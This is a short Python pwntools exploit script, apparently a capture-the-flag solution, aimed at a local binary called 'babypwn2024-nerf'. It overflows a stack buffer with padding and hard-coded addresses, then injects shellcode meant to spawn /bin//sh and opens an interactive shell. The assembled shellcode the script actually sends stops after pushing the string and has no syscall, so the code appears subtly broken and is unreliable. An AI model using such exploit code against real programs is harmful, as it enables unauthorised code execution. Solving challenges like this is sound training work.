from pwn import *

r = process('./babypwn2024-nerf')

context.arch = "amd64"
raw_input()
r.send(b'a' * 32 + p64(0x404100) + p64(0x4011c5))
print(r.recvline())

shellcode = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
raw_input()
shellcode = asm("""
    push rax
    xor rdx, rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
""")
r.send(b'a' * 40 + p64(0x404100) + shellcode)

r.interactive()